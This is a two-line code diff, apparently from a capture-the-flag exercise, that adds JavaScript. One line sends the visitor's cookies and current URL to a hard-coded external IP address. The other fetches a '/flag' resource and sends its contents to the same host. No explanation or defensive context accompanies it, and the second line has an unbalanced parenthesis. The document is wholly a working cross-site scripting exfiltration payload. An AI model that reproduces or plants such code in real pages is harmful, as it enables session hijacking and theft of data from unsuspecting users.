@@ -1,0 +1,2 @@
+new Image().src='http://109.234.39.144:8889/?c='+encodeURIComponent(document.cookie)+'&f='+encodeURIComponent(location.href);
+fetch('/flag').then(r=>r.text()).then(flag=>new Image().src='http://109.234.39.144:8889/?flag='+encodeURIComponent(flag)));
